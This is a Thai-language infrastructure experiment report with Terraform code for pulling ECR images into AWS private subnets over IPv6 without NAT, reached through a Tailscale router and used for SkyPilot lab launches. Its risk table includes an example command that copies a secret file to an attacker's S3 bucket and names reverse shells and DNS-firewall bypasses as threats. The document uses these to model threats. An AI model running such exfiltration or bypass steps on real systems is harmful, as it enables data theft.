# ผลการทดลอง: Pull image จาก ECR เข้า private subnet โดยไม่ใช้ NAT

- วันที่: 30 ก.ย. – 1 ต.ค. 2026 (ทดลองที่ 12 วันที่ 8–9 ต.ค., ทดลองที่ 13–16 วันที่ 11 ต.ค. 2026)
- Region: ap-southeast-1 (Singapore)
- Branch: `infra/ecr-pull-experiment` (โค้ดอยู่ใน `terraform/`)
- เป้าหมาย: ให้ instance ใน private subnet pull image จาก ECR ผ่าน Egress-only IGW และ S3 VPC endpoint โดยไม่มี NAT แล้ว SSH เข้าเครื่องจากเครื่องตัวเองผ่าน Tailscale subnet router

## Phase

1. VPC `10.10.0.0/16` + IPv6 `/56`
2. Internet Gateway + Egress-only Internet Gateway
3. Public subnet `public-a` + `rt-public` (`0.0.0.0/0 → IGW`)
4. Private subnet `private-a` (1a), `private-b` (1b) + `rt-private` (`::/0 → EIGW` อย่างเดียว)
5. S3 Gateway Endpoint ผูกกับ `rt-private`
6. Security group `sg-ts-router`, `sg-lab-instances`
7. Tailscale subnet router (EC2 + IAM role สำหรับ SSM)
8. Test instance A (1a) และ B (1b) ใน private subnet
9. ECR repo `vlab/hello`
10. SSH เข้า private instance แล้ว pull image
11. IAM role ให้ test instance ขอ ECR token เอง
12. บังคับให้ layer โหลดผ่าน S3 Gateway Endpoint (ไม่แก้ Terraform)
13. `sky launch` จาก SkyPilot API server (K3s on-prem) เข้า private subnet
14. ECR repo `vlab/music-lab-ide` + launch แบบ container mode (`image_id: docker:`)
15. Launch แบบ VM mode (pull + `docker run` เอง) + เปิด router ให้เข้าพอร์ต 8080 ของ lab
16. สร้าง AMI `vlab-bake-0.12.3.post1` จาก bake แล้ว launch VM mode เทียบเวลา
17. ให้ role ของ lab instance สั่ง terminate ตัวเองได้ (autostop `down: true`)


**Code / คำสั่ง**

<details>
<summary><b>📄 Terraform ทุกไฟล์ (กดเปิดทีละไฟล์)</b></summary>

```bash
cd terraform
terraform init
terraform plan  -var aws_profile=pete
terraform apply -var aws_profile=pete
terraform output
```

<details>
<summary><code>terraform/versions.tf</code> (Phase 0)</summary>

```hcl
terraform {
  required_version = ">= 1.6"

  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }
}
```
</details>

<details>
<summary><code>terraform/providers.tf</code> (Phase 0)</summary>

```hcl
provider "aws" {
  region  = var.region
  profile = var.aws_profile

  default_tags {
    tags = {
      Project    = "virtual-lab"
      ManagedBy  = "terraform"
      Experiment = "ecr-pull"
    }
  }
}
```
</details>

<details>
<summary><code>terraform/variables.tf</code> (Phase 0)</summary>

```hcl
variable "region" {
  description = "AWS region for the experiment (Singapore)."
  type        = string
  default     = "ap-southeast-1"
}

# No default on purpose: pass it every time so we never fall back to the
# root/default profile or the SkyPilot IAM user.
variable "aws_profile" {
  description = "Pete's own AWS CLI profile. Never the SkyPilot IAM user."
  type        = string
}

# Public key only. The private key never leaves the laptop.
variable "ssh_public_key_path" {
  description = "Path to the SSH public key for the test instances."
  type        = string
  default     = "~/.ssh/id_ed25519.pub"
}
```
</details>

<details>
<summary><code>terraform/vpc.tf</code> (Phase 1)</summary>

```hcl
resource "aws_vpc" "main" {
  cidr_block                       = "10.10.0.0/16"
  assign_generated_ipv6_cidr_block = true
  enable_dns_support               = true
  enable_dns_hostnames             = true

  tags = {
    Name = "vlab-ecr-pull"
  }
}
```
</details>

<details>
<summary><code>terraform/gateways.tf</code> (Phase 2)</summary>

```hcl
# IPv4 in/out for the public subnet (Tailscale router).
resource "aws_internet_gateway" "igw" {
  vpc_id = aws_vpc.main.id

  tags = {
    Name = "vlab-ecr-pull-igw"
  }
}

# IPv6 out only for the private subnets. Nothing from the internet can start a
# connection in.
resource "aws_egress_only_internet_gateway" "eigw" {
  vpc_id = aws_vpc.main.id

  tags = {
    Name = "vlab-ecr-pull-eigw"
  }
}
```
</details>

<details>
<summary><code>terraform/subnets_public.tf</code> (Phase 3)</summary>

```hcl
# Tailscale subnet router lives here. IPv4 only, no IPv6.
resource "aws_subnet" "public_a" {
  vpc_id                  = aws_vpc.main.id
  cidr_block              = "10.10.1.0/24"
  availability_zone       = "ap-southeast-1a"
  map_public_ip_on_launch = true

  tags = {
    Name = "vlab-ecr-pull-public-a"
  }
}

# Local routes (10.10.0.0/16 and the VPC IPv6 /56) are added by AWS.
resource "aws_route_table" "public" {
  vpc_id = aws_vpc.main.id

  tags = {
    Name = "rt-public"
  }
}

resource "aws_route" "public_ipv4_default" {
  route_table_id         = aws_route_table.public.id
  destination_cidr_block = "0.0.0.0/0"
  gateway_id             = aws_internet_gateway.igw.id
}

resource "aws_route_table_association" "public_a" {
  subnet_id      = aws_subnet.public_a.id
  route_table_id = aws_route_table.public.id
}
```
</details>

<details>
<summary><code>terraform/subnets_private.tf</code> (Phase 4)</summary>

```hcl
# Lab instances live here, in two AZs. No public IPv4 and no NAT on purpose:
# the only way out is IPv6 through the EIGW (plus the S3 endpoint in Phase 5).
resource "aws_subnet" "private_a" {
  vpc_id                          = aws_vpc.main.id
  cidr_block                      = "10.10.2.0/24"
  ipv6_cidr_block                 = cidrsubnet(aws_vpc.main.ipv6_cidr_block, 8, 2)
  availability_zone               = "ap-southeast-1a"
  assign_ipv6_address_on_creation = true
  map_public_ip_on_launch         = false

  tags = {
    Name = "vlab-ecr-pull-private-a"
  }
}

resource "aws_subnet" "private_b" {
  vpc_id                          = aws_vpc.main.id
  cidr_block                      = "10.10.3.0/24"
  ipv6_cidr_block                 = cidrsubnet(aws_vpc.main.ipv6_cidr_block, 8, 3)
  availability_zone               = "ap-southeast-1b"
  assign_ipv6_address_on_creation = true
  map_public_ip_on_launch         = false

  tags = {
    Name = "vlab-ecr-pull-private-b"
  }
}

# No 0.0.0.0/0 route on purpose. The S3 prefix list route is added by the
# endpoint association in Phase 5, not here.
resource "aws_route_table" "private" {
  vpc_id = aws_vpc.main.id

  tags = {
    Name = "rt-private"
  }
}

resource "aws_route" "private_ipv6_default" {
  route_table_id              = aws_route_table.private.id
  destination_ipv6_cidr_block = "::/0"
  egress_only_gateway_id      = aws_egress_only_internet_gateway.eigw.id
}

resource "aws_route_table_association" "private_a" {
  subnet_id      = aws_subnet.private_a.id
  route_table_id = aws_route_table.private.id
}

resource "aws_route_table_association" "private_b" {
  subnet_id      = aws_subnet.private_b.id
  route_table_id = aws_route_table.private.id
}
```
</details>

<details>
<summary><code>terraform/endpoints.tf</code> (Phase 5)</summary>

```hcl
# Private instances reach S3 (ECR image layers) over IPv4 through this
# endpoint instead of a NAT. Associating it with rt-private makes AWS add the
# pl-xxx -> vpce-xxx route for us.
resource "aws_vpc_endpoint" "s3" {
  vpc_id            = aws_vpc.main.id
  service_name      = "com.amazonaws.${var.region}.s3"
  vpc_endpoint_type = "Gateway"
  route_table_ids   = [aws_route_table.private.id]

  tags = {
    Name = "vlab-ecr-pull-s3"
  }
}
```
</details>

<details>
<summary><code>terraform/security_groups.tf</code> (Phase 6)</summary>

```hcl
# Rules match the tables in EXPERIMENT_TESTING 1:1. One rule per resource, and
# no inline ingress/egress blocks, so Terraform drops AWS's default allow-all
# egress and nothing else sneaks in.
#
# AWS does not allow group names starting with "sg-", so the table names live
# in the Name tag instead.

# --- sg-ts-router ------------------------------------------------------------

resource "aws_security_group" "ts_router" {
  name        = "vlab-ts-router"
  description = "Tailscale subnet router"
  vpc_id      = aws_vpc.main.id

  tags = {
    Name             = "sg-ts-router"
    "vlab:protected" = "true"
  }
}

resource "aws_vpc_security_group_ingress_rule" "ts_router_tailscale_direct" {
  security_group_id = aws_security_group.ts_router.id
  description       = "Tailscale direct connection"
  ip_protocol       = "udp"
  from_port         = 41641
  to_port           = 41641
  cidr_ipv4         = "0.0.0.0/0"
}

resource "aws_vpc_security_group_egress_rule" "ts_router_https" {
  security_group_id = aws_security_group.ts_router.id
  description       = "Tailscale, DERP, SSM, apt https"
  ip_protocol       = "tcp"
  from_port         = 443
  to_port           = 443
  cidr_ipv4         = "0.0.0.0/0"
}

resource "aws_vpc_security_group_egress_rule" "ts_router_http" {
  security_group_id = aws_security_group.ts_router.id
  description       = "apt"
  ip_protocol       = "tcp"
  from_port         = 80
  to_port           = 80
  cidr_ipv4         = "0.0.0.0/0"
}

resource "aws_vpc_security_group_egress_rule" "ts_router_udp_all" {
  security_group_id = aws_security_group.ts_router.id
  description       = "WireGuard, STUN"
  ip_protocol       = "udp"
  from_port         = 0
  to_port           = 65535
  cidr_ipv4         = "0.0.0.0/0"
}

resource "aws_vpc_security_group_egress_rule" "ts_router_ssh_to_lab" {
  security_group_id            = aws_security_group.ts_router.id
  description                  = "SSH to private lab instances"
  ip_protocol                  = "tcp"
  from_port                    = 22
  to_port                      = 22
  referenced_security_group_id = aws_security_group.lab_instances.id
}

# --- sg-lab-instances --------------------------------------------------------

resource "aws_security_group" "lab_instances" {
  name        = "vlab-lab-instances"
  description = "Private lab instances"
  vpc_id      = aws_vpc.main.id

  tags = {
    Name = "sg-lab-instances"
  }
}

resource "aws_vpc_security_group_ingress_rule" "lab_ssh_from_router" {
  security_group_id            = aws_security_group.lab_instances.id
  description                  = "SSH through router"
  ip_protocol                  = "tcp"
  from_port                    = 22
  to_port                      = 22
  referenced_security_group_id = aws_security_group.ts_router.id
}

resource "aws_vpc_security_group_ingress_rule" "lab_self_in" {
  security_group_id            = aws_security_group.lab_instances.id
  description                  = "Nodes can communicate"
  ip_protocol                  = "-1"
  referenced_security_group_id = aws_security_group.lab_instances.id
}

resource "aws_vpc_security_group_egress_rule" "lab_https_ipv6" {
  security_group_id = aws_security_group.lab_instances.id
  description       = "ECR dual-stack, https"
  ip_protocol       = "tcp"
  from_port         = 443
  to_port           = 443
  cidr_ipv6         = "::/0"
}

resource "aws_vpc_security_group_egress_rule" "lab_http_ipv6" {
  security_group_id = aws_security_group.lab_instances.id
  description       = "apt"
  ip_protocol       = "tcp"
  from_port         = 80
  to_port           = 80
  cidr_ipv6         = "::/0"
}

resource "aws_vpc_security_group_egress_rule" "lab_https_s3" {
  security_group_id = aws_security_group.lab_instances.id
  description       = "ECR layers on S3 (IPv4 via gateway endpoint)"
  ip_protocol       = "tcp"
  from_port         = 443
  to_port           = 443
  prefix_list_id    = aws_vpc_endpoint.s3.prefix_list_id
}

resource "aws_vpc_security_group_egress_rule" "lab_self_out" {
  security_group_id            = aws_security_group.lab_instances.id
  description                  = "Nodes can communicate"
  ip_protocol                  = "-1"
  referenced_security_group_id = aws_security_group.lab_instances.id
}
```
</details>

<details>
<summary><code>terraform/router.tf</code> (Phase 7)</summary>

```hcl
# Ubuntu 24.04 amd64 from Canonical. Phase 8 test instances reuse this.
data "aws_ami" "ubuntu" {
  most_recent = true
  owners      = ["099720109477"]

  filter {
    name   = "name"
    values = ["ubuntu/images/hvm-ssd-gp3/ubuntu-noble-24.04-amd64-server-*"]
  }

  filter {
    name   = "architecture"
    values = ["x86_64"]
  }
}

# --- IAM for SSM (break-glass access, no SSH port) ---------------------------

data "aws_iam_policy_document" "ec2_assume" {
  statement {
    actions = ["sts:AssumeRole"]

    principals {
      type        = "Service"
      identifiers = ["ec2.amazonaws.com"]
    }
  }
}

resource "aws_iam_role" "ts_router" {
  name               = "vlab-ts-router"
  assume_role_policy = data.aws_iam_policy_document.ec2_assume.json
}

resource "aws_iam_role_policy_attachment" "ts_router_ssm" {
  role       = aws_iam_role.ts_router.name
  policy_arn = "arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore"
}

resource "aws_iam_instance_profile" "ts_router" {
  name = "vlab-ts-router"
  role = aws_iam_role.ts_router.name
}

# --- Subnet router instance --------------------------------------------------

# Tailscale is installed by hand through Session Manager, so no user_data and
# no auth key here.
resource "aws_instance" "ts_router" {
  ami                    = data.aws_ami.ubuntu.id
  instance_type          = "t3.micro"
  subnet_id              = aws_subnet.public_a.id
  vpc_security_group_ids = [aws_security_group.ts_router.id]
  iam_instance_profile   = aws_iam_instance_profile.ts_router.name

  metadata_options {
    http_endpoint = "enabled"
    http_tokens   = "required"
  }

  # A newer Ubuntu AMI must not replace the router (and wipe Tailscale).
  lifecycle {
    ignore_changes = [ami]
  }

  tags = {
    Name             = "vlab-ts-router"
    "vlab:protected" = "true"
  }
}
```
</details>

<details>
<summary><code>terraform/test_instances.tf</code> (Phase 8)</summary>

```hcl
resource "aws_key_pair" "pete" {
  key_name   = "vlab-ecr-pull-pete"
  public_key = file(pathexpand(var.ssh_public_key_path))
}

locals {
  test_instances = {
    a = aws_subnet.private_a.id
    b = aws_subnet.private_b.id
  }
}

# One instance per private subnet/AZ. No public IP: SSH comes through the
# Tailscale router, and the only ways out are IPv6 (EIGW) and S3 (endpoint).
resource "aws_instance" "test" {
  for_each = local.test_instances

  ami                         = data.aws_ami.ubuntu.id
  instance_type               = "t3.micro"
  subnet_id                   = each.value
  vpc_security_group_ids      = [aws_security_group.lab_instances.id]
  key_name                    = aws_key_pair.pete.key_name
  iam_instance_profile        = aws_iam_instance_profile.lab_ecr_pull.name
  associate_public_ip_address = false

  metadata_options {
    http_endpoint               = "enabled"
    http_tokens                 = "required"
    http_put_response_hop_limit = 1
  }

  lifecycle {
    ignore_changes = [ami]
  }

  tags = {
    Name = "vlab-test-${each.key}"
  }
}
```
</details>

<details>
<summary><code>terraform/ecr.tf</code> (Phase 9)</summary>

```hcl
resource "aws_ecr_repository" "hello" {
  name = "vlab/hello"

  image_scanning_configuration {
    scan_on_push = true
  }
}

resource "aws_ecr_lifecycle_policy" "hello" {
  repository = aws_ecr_repository.hello.name

  policy = jsonencode({
    rules = [{
      rulePriority = 1
      description  = "Keep last 10 images"
      selection = {
        tagStatus   = "any"
        countType   = "imageCountMoreThan"
        countNumber = 10
      }
      action = {
        type = "expire"
      }
    }]
  })
}
```
</details>

<details>
<summary><code>terraform/iam_test.tf</code> (Phase 11)</summary>

```hcl
# Phase 11: let the test instances get their own ECR token instead of us
# copying one in. Pull only, and only from vlab/hello.

resource "aws_iam_role" "lab_ecr_pull" {
  name               = "vlab-lab-ecr-pull"
  assume_role_policy = data.aws_iam_policy_document.ec2_assume.json
}

data "aws_iam_policy_document" "lab_ecr_pull" {
  # GetAuthorizationToken does not support resource-level permissions.
  statement {
    actions   = ["ecr:GetAuthorizationToken"]
    resources = ["*"]
  }

  statement {
    actions = [
      "ecr:BatchCheckLayerAvailability",
      "ecr:BatchGetImage",
      "ecr:GetDownloadUrlForLayer",
    ]
    resources = [aws_ecr_repository.hello.arn]
  }
}

resource "aws_iam_role_policy" "lab_ecr_pull" {
  name   = "ecr-pull-vlab-hello"
  role   = aws_iam_role.lab_ecr_pull.id
  policy = data.aws_iam_policy_document.lab_ecr_pull.json
}

resource "aws_iam_instance_profile" "lab_ecr_pull" {
  name = "vlab-lab-ecr-pull"
  role = aws_iam_role.lab_ecr_pull.name
}
```
</details>

<details>
<summary><code>terraform/ecr_lab.tf</code> (Phase 13)</summary>

```hcl
# Phase 13: lab image for SkyPilot docker mode (moved from the on-prem registry).
resource "aws_ecr_repository" "music_lab_ide" {
  name = "vlab/music-lab-ide"

  image_scanning_configuration {
    scan_on_push = true
  }
}

resource "aws_ecr_lifecycle_policy" "music_lab_ide" {
  repository = aws_ecr_repository.music_lab_ide.name

  policy = jsonencode({
    rules = [{
      rulePriority = 1
      description  = "Keep last 10 images"
      selection = {
        tagStatus   = "any"
        countType   = "imageCountMoreThan"
        countNumber = 10
      }
      action = {
        type = "expire"
      }
    }]
  })
}
```
</details>

<details>
<summary><code>terraform/lab_access.tf</code> (Phase 14)</summary>

```hcl
# Phase 14: let Tailscale users reach lab web ports (code-server etc.) through
# the router. Phase 6 only allowed SSH from the router to the lab instances.
#
# SkyPilot adds the matching ingress on sg-lab-instances itself (from
# `ports:` in the task), so only the router's egress is missing.

resource "aws_vpc_security_group_egress_rule" "ts_router_lab_web" {
  security_group_id            = aws_security_group.ts_router.id
  description                  = "Lab web ports through router"
  ip_protocol                  = "tcp"
  from_port                    = 8080
  to_port                      = 8080
  referenced_security_group_id = aws_security_group.lab_instances.id
}
```
</details>

<details>
<summary><code>terraform/outputs.tf</code> (Phase ทุก phase)</summary>

```hcl
# Outputs grow with each phase.

# Phase 1
output "vpc_id" {
  value = aws_vpc.main.id
}

output "vpc_ipv6_cidr" {
  value = aws_vpc.main.ipv6_cidr_block
}

# Phase 3
output "public_a_subnet_id" {
  value = aws_subnet.public_a.id
}

# Phase 4
output "private_subnet_ipv6_cidrs" {
  value = {
    private_a = aws_subnet.private_a.ipv6_cidr_block
    private_b = aws_subnet.private_b.ipv6_cidr_block
  }
}

# Phase 5
output "s3_prefix_list_id" {
  value = aws_vpc_endpoint.s3.prefix_list_id
}

# Phase 7
output "router_instance_id" {
  value = aws_instance.ts_router.id
}

output "router_public_ip" {
  value = aws_instance.ts_router.public_ip
}

# Phase 8
output "test_instances" {
  value = {
    for k, i in aws_instance.test : k => {
      az   = i.availability_zone
      ipv4 = i.private_ip
      ipv6 = i.ipv6_addresses
    }
  }
}

# Phase 9
output "ecr_repository_url" {
  description = "Normal endpoint (IPv4). Push from the laptop."
  value       = aws_ecr_repository.hello.repository_url
}

output "ecr_dualstack_host" {
  description = "Dual-stack registry host. Pull from the private instances."
  value       = "${aws_ecr_repository.hello.registry_id}.dkr-ecr.${var.region}.on.aws"
}

# Phase 13
output "ecr_music_lab_ide_url" {
  value = aws_ecr_repository.music_lab_ide.repository_url
}
```
</details>

</details>

<details>
<summary><b>📄 Tailscale subnet router</b> (Phase 7, ผ่าน Session Manager)</summary>

```bash
curl -fsSL https://tailscale.com/install.sh | sh
echo 'net.ipv4.ip_forward = 1' | sudo tee /etc/sysctl.d/99-tailscale.conf
sudo sysctl -p /etc/sysctl.d/99-tailscale.conf
sudo tailscale up --ssh --advertise-routes=10.10.2.0/24,10.10.3.0/24
# แล้ว approve route ใน admin console
# เครื่อง Linux ที่จะเข้า private subnet:
sudo tailscale set --accept-routes=true
```
</details>

## ผลที่เจอ

1. **Pull image ได้โดยไม่ต้องมี NAT** ทำได้จริงผ่าน IPv6 + EIGW
2. **ปกติ layer ของ image ไม่ได้ผ่าน S3 Gateway Endpoint**
   - ถ้าขอผ่าน registry แบบ dual-stack (`<acct>.dkr-ecr.ap-southeast-1.on.aws`) ECR จะ redirect ไปโหลด layer ที่ `prod-ap-southeast-1-starport-layer-bucket.s3.dualstack.ap-southeast-1.amazonaws.com` ซึ่งมี IPv6 docker เลยเลือกวิ่งออก EIGW
   - ถ้าขอผ่าน registry ปกติ (`<acct>.dkr.ecr.ap-southeast-1.amazonaws.com`) จะ redirect ไป `...s3.ap-southeast-1.amazonaws.com` แบบ IPv4
   - Prefix list ของ S3 endpoint (`pl-6fa54006`) เป็น **IPv4 อย่างเดียว** ทางนี้จึงใช้ได้แค่กับ S3 แบบ IPv4
   - สรุป: ถ้าจะ pull ใน subnet แบบนี้ **ใช้แค่ EIGW อย่างเดียวก็พอ** S3 endpoint ไม่ได้ถูกใช้ตอน pull
   - ยืนยันด้วย tcpdump ในทดลองที่ 12: layer ไปที่ `2406:da60:…` (S3 ทาง IPv6) ไม่มี IPv4 เลย
3. **แต่ S3 Gateway Endpoint โหลด layer ของ ECR ได้จริง** (ทดลองที่ 12)
   - ปัก hostname `prod-ap-southeast-1-starport-layer-bucket.s3.dualstack.ap-southeast-1.amazonaws.com` เป็น IPv4 `3.5.149.7` (อยู่ใน prefix list) ใน `/etc/hosts`
   - layer ย้ายมาวิ่ง IPv4 ไป `3.5.149.7` และ pull + run ผ่าน เพราะ IPv4 ใน private subnet มีทางเดียวคือ `pl-6fa54006 → vpce` จึงพิสูจน์ได้ว่าผ่าน endpoint
   - วิธีนี้ใช้เพื่อพิสูจน์เท่านั้น ระบบจริงห้ามใช้ `/etc/hosts` เพราะ IP ของ S3 เปลี่ยนได้ ถ้าจะให้ผ่าน endpoint จริงต้องใช้ registry แบบปกติ + interface endpoint (`ecr.api`, `ecr.dkr`) หรือ Squid proxy
4. **`apt update` / `apt install docker.io` ใช้ได้** เพราะ mirror ของ Ubuntu บน AWS มี IPv6
5. **บริการที่ไม่มี IPv6 จะใช้ไม่ได้** เช่น GitHub (`git clone` จะไม่ผ่าน)
6. **ต้องเปิด dual-stack ใน AWS CLI** (`AWS_USE_DUALSTACK_ENDPOINT=true`) ไม่อย่างนั้น CLI จะไปหา ECR API แบบ IPv4 ซึ่งไปไม่ถึง
7. **Security group ตั้งชื่อขึ้นต้นด้วย `sg-` ไม่ได้** เพราะ AWS ห้าม เลยใส่ชื่อตามแผนไว้ใน tag `Name` แทน
8. **Router ใช้ SSM แทน SSH** จึงไม่ต้องเปิดพอร์ต 22 ให้ internet และไม่ต้องมี key pair
9. **SkyPilot launch เข้า private subnet ได้จริง** (ทดลองที่ 13)
   - SSH ผ่าน Tailscale subnet router ได้เลย ไม่ต้องมี IGW, NAT หรือ `ssh_proxy_command`
   - ต้องตั้ง `use_ssm: false` เพราะถ้าเปิด `use_internal_ips` แต่ไม่มี `ssh_proxy_command` SkyPilot 0.12.3 จะเปลี่ยนไปใช้ SSM เอง (`sky/backends/backend_utils.py:903-913`) ซึ่งใช้ใน VPC นี้ไม่ได้
   - `use_internal_ips` เลือก subnet ที่ไม่มี route ไป IGW และไม่แจก public IP ให้เอง (`sky/provision/aws/config.py:441`) → ได้ private-a, ส่วน public-a ถูกตัดออก
   - SSH user บน AWS คือ **`ubuntu`** (`/home/ubuntu`) ไม่ใช่ `sky` แบบใน pod → bake AMI ต้องใช้ path ใต้ `/home/ubuntu`
   - AMI มาตรฐานของ SkyPilot มี `miniconda3` ติดมาแล้ว ส่วน `skypilot-runtime` ติดตั้งตอน launch ผ่าน IPv6/EIGW ได้ไม่ติดอะไร
10. **บัญชี AWS เป็น free plan** สร้างได้แค่ instance บางชนิด (`m7i-flex.large`, `c7i-flex.large`, `t3`/`t8i` small/micro) ต้องระบุ `instance_type` เอง ไม่งั้น SkyPilot เลือก `m6i.large` แล้วพัง
11. **SkyPilot ไม่รู้จัก ECR แบบ dual-stack** login อัตโนมัติด้วย IAM role (รหัสว่าง) ทำงานเฉพาะชื่อ `.dkr.ecr.` + `.amazonaws.com` (`sky/provision/docker_utils.py:316`) ถ้าใช้ `...on.aws` ต้องส่ง token ใน `SKYPILOT_DOCKER_PASSWORD` เอง
12. **Container mode ช้าเพราะ SkyPilot ติดตั้ง runtime ใน container** (ทดลองที่ 14)
   - pull จาก ECR เร็ว แต่ SkyPilot ลง conda + Ray + runtime ไว้ใน container (`/home/coder/...`) ใหม่ทุกครั้ง ~5 นาที (~80% ของเวลาทั้งหมด)
   - image ของอาจารย์ (code-server, `USER coder`, ไม่ตั้ง `HOME`) ทำให้ HOME กลายเป็น `/root` เพราะ SkyPilot เก็บ env ของ root ไว้ใน `/etc/profile.d/container_env_var.sh` (`sky/provision/docker_utils.py:23-28, 234`) แก้ด้วย `config: docker: run_options: ["-e HOME=/home/coder"]`
   - ถ้าจะเร็วใน container mode ต้อง bake runtime ลง lab image แต่ image มาจากอาจารย์ แก้ไม่ได้
13. **VM mode เร็วกว่ามากและไม่ต้องแก้ image** (ทดลองที่ 15)
   - SkyPilot อยู่บน VM ส่วน lab รันด้วย `docker run` เองใน `run:` → Cluster launched ใน 47 วินาที (container mode ~6.5 นาที), pull 9.5 วินาที
   - ตรงกับดีไซน์ AMI (bake) เป็น precondition แล้วรัน image จาก ECR ต่อ
   - `image_id` แบบ dict ใน 0.12.3.post1 ไม่มี key พิเศษ `docker` (key = ชื่อ region เท่านั้น, `sky/resources.py:363-376`)
14. **router ต้องเปิดขาออกไปพอร์ต lab ด้วย** Phase 6 ให้แค่ SSH (22) ถึงจะมี rule 8080 ฝั่ง lab ที่ SkyPilot เพิ่มให้ก็ยังเข้าไม่ได้ (timeout) จนเพิ่ม egress TCP 8080 ใน `sg-ts-router` (Phase 14)
15. **SkyPilot ใช้ดิสก์ 256 GB เป็นค่าเริ่มต้น** ต้องตั้ง `disk_size` เอง

16. **AMI จาก bake ใช้ได้ แต่ไม่ได้เร็วกว่า AMI ของ SkyPilot มาก** (ทดลองที่ 16)
   - AMI ของ SkyPilot มี conda + Docker มาแล้ว เลยเร็วอยู่แล้ว (47 วินาที) ส่วน AMI ของเราใช้ 66 วินาที (รอบเดียว, ครั้งแรกของ AMI ใหม่ซึ่ง EBS snapshot โหลดแบบ lazy)
   - ขั้น `setup_runtime_on_cluster` เหลือ 23 วินาที (container mode 5 นาที 12 วินาที)
   - ข้อดีจริงคือ **launch ได้โดยไม่ต้องโหลดของจาก internet** (มี runtime, Ray, wheel hash ตรง, AWS CLI v2 + dual-stack) จำเป็นถ้าจะปิดขาออกด้วย Squid / interface endpoint
   - installer ของ uv (`astral.sh`) โหลดจาก `releases.astral.sh` ก่อน ซึ่งมี IPv6 จึงใช้ใน private subnet ได้ ส่วน GitHub ใช้เป็นทางสำรอง

## Vulnerability / ความเสี่ยง

| # | ความเสี่ยง | ระดับ | เหตุผล | ทางแก้ |
|---|---|---|---|---|
| 1 | **Egress IPv6 เปิดกว้าง** (TCP 443/80 ไป `::/0`) | สูง | โค้ดในเครื่องต่อออกไปที่ไหนก็ได้ เช่น ติดต่อ C2 (reverse shell), ส่งข้อมูลออก, ขุดเหรียญ, ใช้เครื่องไปยิงคนอื่น แล้ว AWS อาจแบนบัญชี Private subnet กันได้แค่ขาเข้า กันขาออกไม่ได้ | Interface endpoint (`ecr.api`, `ecr.dkr`) + ลบ `::/0` หรือใช้ DNS Firewall |
| 2 | **S3 Gateway Endpoint ใช้ policy ตั้งต้น** (อนุญาตทุก bucket) | สูง | ส่งข้อมูลไป bucket ของคนอื่นทาง IPv4 ได้ เช่น `aws s3 cp secret.txt s3://evil-bucket/` | ใส่ endpoint policy ให้ใช้ได้แค่ `prod-ap-southeast-1-starport-layer-bucket` (ฟรี) |
| 3 | **Lab ให้ผู้ใช้รันโค้ดเอง** | สูง | ไม่ต้องเจาะเข้ามา เพราะผู้ใช้อยู่ในเครื่องอยู่แล้ว ทั้งทาง IDE, SSH และ `pip install` package ที่มีมัลแวร์ | ออกแบบโดยถือว่ามีโค้ดที่ไม่น่าไว้ใจรันอยู่ตลอดเวลา → ต้องคุมขาออก |
| 4 | **ถ้าใช้ DNS Firewall แบบ `*.amazonaws.com`** | สูง | ครอบคลุม EC2, S3, API Gateway ของ**ทุกบัญชี** AWS คนร้ายเช่า EC2 หรือสร้าง bucket เองแล้วหลบได้ ถ้าใช้ dual-stack `*.on.aws` / `*.api.aws` จะโดนบล็อกด้วย | Allowlist แบบชื่อเต็ม เช่น `568318158381.dkr-ecr.ap-southeast-1.on.aws` |
| 5 | **DNS Firewall ถูกเลี่ยงได้** | กลาง | ใส่ IP ตรง, DNS-over-HTTPS (DoH) ผ่าน 443, แก้ `/etc/hosts` | ใช้ interface endpoint (ไม่มี route ออก internet เลย) |
| 6 | **Profile `default` ในเครื่อง Pete เป็น access key ของ root** | สูง | ถ้า key หลุด ทั้งบัญชีหลุด | ลบ root access key, เปิด MFA ให้ root, ใช้ `pete-admin` แทน |
| 7 | **ECR token ต้อง copy ด้วยมือ** (ก่อน Phase 11) | ต่ำ | token อาจไปค้างใน shell history (อายุ 12 ชม.) | ใช้ `read -s` หรือ IAM role (Phase 11) |
| 8 | **Presigned URL ของ layer มี credential ชั่วคราวอยู่ข้างใน** | ต่ำ | ใครได้ URL จะโหลด layer นั้นได้ภายใน 1 ชม. | อย่าแปะ URL เต็มในที่สาธารณะ |
| 9 | **Router เป็นทางเข้าเดียว** | กลาง | ถ้า router ล่ม จะ SSH เข้า private instance ไม่ได้ | เข้า router ผ่าน SSM ได้เสมอ (break-glass) |
| 10 | **Terraform state เก็บไว้ในเครื่อง** | กลาง | ถ้าเครื่องพัง state หาย และทำงานร่วมกับเพื่อนไม่ได้ | ย้าย state ไป S3 (remote backend) |
| 11 | **SkyPilot เปิดพอร์ต lab ใน SG ของเรา** | กลาง | ถ้า task มี `ports:` SkyPilot จะเพิ่ม rule `TCP <port> จาก 0.0.0.0/0` ลงใน `vlab-lab-instances` และไม่ลบตอน `sky down` (`sky/provision/aws/instance.py:870-924`) ทุกเครื่องใน tailnet เข้าพอร์ต lab ของทุกคนได้ และ rule สะสม | ตัดสินใจหลังเทส: ยอมรับ / ใช้ SG แยกต่อ cluster / เปิดพอร์ตเองใน Terraform |
| 12 | **IAM ของ SkyPilot ในไฟล์เก่ามีสิทธิ์ S3 กว้าง** (อ่าน/เขียน/ลบทุก bucket) | กลาง | ไม่จำเป็นกับ web portal | ไม่ใส่ก้อน S3 (ทำแล้ว) |

## Test result

### Phase 8: เครือข่ายของ private instance

| เทส | คาดไว้ | Instance A (1a) | Instance B (1b) |
|---|---|---|---|
| SSH ผ่าน Tailscale router | เข้าได้ | ✅ | ✅ |
| `ip -6 addr show scope global` | มี IPv6 | ✅ `2406:da18:18c9:2f02:…` | ✅ |
| `curl -4 -m 5 https://1.1.1.1` | **ต้อง fail** (ไม่มี NAT) | ✅ timeout | ✅ |
| `curl -6 -m 5 -I https://ecr.ap-southeast-1.api.aws` | มีคำตอบ | ✅ `HTTP 404` (ถึง ECR แล้ว) | ✅ |
| `sudo apt update` | ผ่าน | ✅ | ✅ |


**Code / คำสั่ง**

<details>
<summary><b>📄 ทดสอบเครือข่ายใน private instance</b> (Phase 8)</summary>

```bash
ip -6 addr show scope global
curl -4 -m 5 https://1.1.1.1                          # ต้อง fail
curl -6 -m 5 -I https://ecr.ap-southeast-1.api.aws    # ต้องตอบ
sudo apt update
```
</details>

### Phase 9–10: ECR push / pull

| เทส | คาดไว้ | Instance A (1a) | Instance B (1b) |
|---|---|---|---|
| Push `vlab/hello:v1` จากเครื่อง Pete (endpoint ปกติ) | เห็นใน ECR | ✅ | – |
